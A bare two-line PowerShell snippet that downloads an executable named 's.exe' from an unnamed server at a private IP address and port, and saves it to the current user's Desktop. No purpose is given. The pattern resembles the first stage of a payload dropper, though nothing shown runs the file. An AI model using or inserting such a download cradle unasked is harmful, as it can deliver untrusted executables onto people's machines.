$httpClient = New-Object System.Net.Http.HttpClient
$httpClient.GetAsync("http://192.168.43.228:5005/s.exe").Result.Content.ReadAsByteArrayAsync().Result | Set-Content "$env:USERPROFILE\Desktop\s.exe" -Encoding Byte
